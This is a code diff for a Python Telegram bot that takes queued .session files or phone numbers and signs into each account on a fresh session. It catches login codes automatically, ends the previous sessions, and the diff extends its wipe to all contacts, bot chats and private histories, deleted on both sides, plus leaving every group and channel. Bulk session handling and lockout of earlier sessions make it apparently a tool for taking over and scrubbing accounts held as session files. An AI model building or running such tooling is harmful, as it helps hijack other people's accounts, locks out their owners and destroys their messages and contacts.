@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Telegram Session Migrator Bot
-+ Очистка профиля (имя, ава, био, выход из всех чатов)
++ Полная очистка аккаунта (профиль, контакты, боты, ЛС, каналы и группы)
 + Режим авто / ручной ввод кода
 + Очередь сессий
 + Создание новой сессии с нуля по номеру телефона (/new)
@@ -50,7 +50,8 @@ from telethon.tl.functions.account import UpdateProfileRequest
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
 from telethon.tl.functions.photos import DeletePhotosRequest, GetUserPhotosRequest
 from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon.tl.functions.messages import DeleteChatUserRequest
+from telethon.tl.functions.messages import DeleteChatUserRequest, DeleteHistoryRequest
+from telethon.tl.functions.contacts import DeleteContactsRequest, GetContactsRequest, BlockRequest
 from telethon.tl.types import User, InputPhoto, Channel, Chat
 
 
@@ -134,7 +135,7 @@ class ActiveMigration:
     waiting_2fa: bool = False
     waiting_manual_code: bool = False
     queue_item: Optional[QueueItem] = None
-    is_new_session: bool = False  # True = создание с нуля по номеру
+    is_new_session: bool = False
 
 
 user_auto_mode: Dict[int, bool] = {}
@@ -197,15 +198,12 @@ async def clear_user_queue(chat_id: int, state: Optional[FSMContext] = None):
     queue_workers[chat_id] = False
     if state:
         await state.clear()
-
-
-# ====================== ОЧИСТКА АККАУНТА ======================
+# ====================== ПОЛНАЯ ОЧИСТКА АККАУНТА ======================
 
 async def clean_account(client: TelegramClient, status: Message):
     try:
-        await status.edit_text("🧹 Очищаю профиль (имя, ава, описание)...")
-
-        # Убираем имя и био
+        # 1. Очистка профиля (имя, био)
+        await status.edit_text("🧹 Очищаю профиль (имя, описание)...")
         try:
             await client(UpdateProfileRequest(
                 first_name=".",
@@ -213,9 +211,9 @@ async def clean_account(client: TelegramClient, status: Message):
                 about=""
             ))
         except Exception as e:
-            logger.warning(f"Не удалось очистить профиль: {e}")
+            logger.warning(f"Не удалось обновить профиль: {e}")
 
-        # Удаляем все фото
+        # 2. Удаление всех аватарок
         try:
             photos = await client(GetUserPhotosRequest(
                 user_id="me",
@@ -235,33 +233,63 @@ async def clean_account(client: TelegramClient, status: Message):
         except Exception as e:
             logger.warning(f"Не удалось удалить фото: {e}")
 
-        await status.edit_text("🧹 Выхожу из всех групп и каналов...")
+        # 3. Удаление всех контактов
+        try:
+            await status.edit_text("🧹 Удаляю все контакты...")
+            contacts_res = await client(GetContactsRequest(hash=0))
+            if hasattr(contacts_res, "users") and contacts_res.users:
+                await client(DeleteContactsRequest(id=contacts_res.users))
+        except Exception as e:
+            logger.warning(f"Не удалось удалить контакты: {e}")
 
-        left = 0
+        # 4. Удаление всех чатов: каналы, группы, боты и личные переписки
+        await status.edit_text("🧹 Очищаю все диалоги (боты, ЛС, группы, каналы)...")
+
+        deleted = 0
         async for dialog in client.iter_dialogs():
             entity = dialog.entity
             try:
                 if isinstance(entity, Channel):
                     await client(LeaveChannelRequest(entity))
-                    left += 1
+                    deleted += 1
                 elif isinstance(entity, Chat):
                     await client(DeleteChatUserRequest(
                         chat_id=entity.id,
                         user_id="me"
                     ))
-                    left += 1
+                    deleted += 1
+                elif isinstance(entity, User):
+                    # Если это бот — блокируем
+                    if getattr(entity, "bot", False):
+                        try:
+                            await client(BlockRequest(id=entity))
+                        except Exception:
+                            pass
 
-                if left % 15 == 0:
+                    # Удаляем переписку и диалог с обеих сторон
+                    try:
+                        await client(DeleteHistoryRequest(
+                            peer=entity,
+                            max_id=0,
+                            just_clear=False,
+                            revoke=True
+                        ))
+                    except Exception:
+                        await client.delete_dialog(entity)
+                    deleted += 1
+
+                if deleted % 15 == 0:
                     await asyncio.sleep(1.5)
                 else:
                     await asyncio.sleep(0.35)
 
             except FloodWaitError as e:
                 await asyncio.sleep(e.seconds + 1)
-            except Exception:
+            except Exception as e:
+                logger.debug(f"Ошибка при удалении диалога: {e}")
                 continue
 
-        await status.edit_text(f"✅ Очистка завершена (вышел из {left} чатов)")
+        await status.edit_text(f"✅ Очистка завершена (удалено {deleted} диалогов, контакты стёрты)")
 
     except Exception as e:
         logger.exception("Ошибка очистки аккаунта")
@@ -350,20 +378,22 @@ async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMCo
 
         if mig.is_new_session:
             caption = (
-                f"✅ <b>Новая сессия создана + очищена!</b>\n\n"
+                f"✅ <b>Новая сессия создана + аккаунт очищен!</b>\n\n"
                 f"📞 <code>{phone}</code>\n"
                 f"🆔 <code>{metadata['id']}</code>\n"
-                f"👤 Имя/ава/био удалены\n"
-                f"🚪 Вышел из всех чатов"
+                f"👤 Профиль сброшен\n"
+                f"📇 Контакты удалены\n"
+                f"🗑 Боты, ЛС, группы и каналы удалены"
             )
         else:
             caption = (
-                f"✅ <b>Новая сессия создана + очищена!</b>\n\n"
+                f"✅ <b>Сессия перенесена + аккаунт очищен!</b>\n\n"
                 f"📞 <code>{phone}</code>\n"
                 f"🆔 <code>{metadata['id']}</code>\n"
-                f"👤 Имя/ава/био удалены\n"
-                f"🚪 Вышел из всех чатов\n"
-                f"🔒 Старая сессия завершена"
+                f"👤 Профиль сброшен\n"
+                f"📇 Контакты удалены\n"
+                f"🗑 Боты, ЛС, группы и каналы удалены\n"
+                f"🔒 Предыдущие сессии завершены"
             )
 
         await message.answer_document(
@@ -497,7 +527,7 @@ async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
 
         try:
             await new_client.sign_in(phone=phone, code=code, phone_code_hash=mig.phone_code_hash)
-            await status.edit_text("✅ Вход выполнен! Очищаю аккаунт...")
+            await status.edit_text("✅ Вход выполнен! Начинаю полную очистку...")
             await finalize(mig, status, state)
 
         except SessionPasswordNeededError:
@@ -517,8 +547,6 @@ async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
         logger.exception("Ошибка process_one_session")
         await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
         await cleanup_migration(mig)
-
-
 # ====================== ВОРКЕР ОЧЕРЕДИ ======================
 
 async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
@@ -562,16 +590,19 @@ async def cmd_start(message: Message, state: FSMContext):
 
     mode = "авто" if get_auto_mode(chat_id) else "ручной"
     await message.answer(
-        "🔄 <b>Мигратор сессий</b>\n\n"
+        "🔄 <b>Мигратор сессий + Полная очистка</b>\n\n"
         "Отправляй <b>.session</b> файлы (можно несколько — по очереди).\n"
         "Или создай новую сессию с нуля: <b>/new</b>\n\n"
-        f"Текущий режим кода (для миграции): <b>{mode}</b>\n"
+        f"Текущий режим кода: <b>{mode}</b>\n"
         "• /auto — ловить код автоматически\n"
         "• /manual — вводить код вручную\n"
         "• /new — создать сессию по номеру телефона\n\n"
-        "После входа бот:\n"
-        "• Убирает имя, аву и описание\n"
-        "• Выходит из всех чатов и каналов\n"
+        "<b>При обработке бот полностью стирает всё:</b>\n"
+        "• Имя, аватарки и био\n"
+        "• Все контакты аккаунта\n"
+        "• Все личные диалоги (с историей)\n"
+        "• Блокирует и удаляет всех ботов\n"
+        "• Выходит из всех групп и каналов\n"
         "• Завершает старую сессию (при миграции)",
         reply_markup=cancel_kb(),
     )
@@ -593,7 +624,6 @@ async def cmd_manual(message: Message):
 async def cmd_new(message: Message, state: FSMContext):
     chat_id = message.chat.id
 
-    # Нельзя запускать, если уже идёт миграция или очередь
     if chat_id in current_migration:
         await message.answer("❌ Уже идёт обработка. Сначала /cancel")
         return
@@ -606,7 +636,7 @@ async def cmd_new(message: Message, state: FSMContext):
         "📱 <b>Создание новой сессии</b>\n\n"
         "Отправь номер телефона в международном формате:\n"
         "<code>+79001234567</code>\n\n"
-        "Бот запросит код и создаст чистую сессию.",
+        "Бот запросит код и полностью очистит созданный аккаунт.",
         reply_markup=cancel_kb(),
     )
 
@@ -620,7 +650,6 @@ async def process_phone(message: Message, state: FSMContext):
         await message.answer("❌ Отправь номер телефона.")
         return
 
-    # Нормализация номера
     if raw.startswith("8") and len(raw) == 11:
         raw = "+7" + raw[1:]
     elif raw.startswith("7") and len(raw) == 11:
@@ -772,7 +801,7 @@ async def process_manual_code(message: Message, state: FSMContext):
         )
         mig.waiting_manual_code = False
         await state.clear()
-        await status.edit_text("✅ Вход выполнен! Очищаю аккаунт...")
+        await status.edit_text("✅ Вход выполнен! Начинаю полную очистку...")
         await finalize(mig, status, state)
 
         if user_queues.get(chat_id):
@@ -808,7 +837,7 @@ async def process_2fa(message: Message, state: FSMContext):
         await mig.new_client.sign_in(password=password)
         mig.waiting_2fa = False
         await state.clear()
-        await status.edit_text("✅ 2FA пройден! Очищаю аккаунт...")
+        await status.edit_text("✅ 2FA пройден! Начинаю полную очистку...")
         await finalize(mig, status, state)
 
         if user_queues.get(chat_id):
@@ -847,3 +876,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
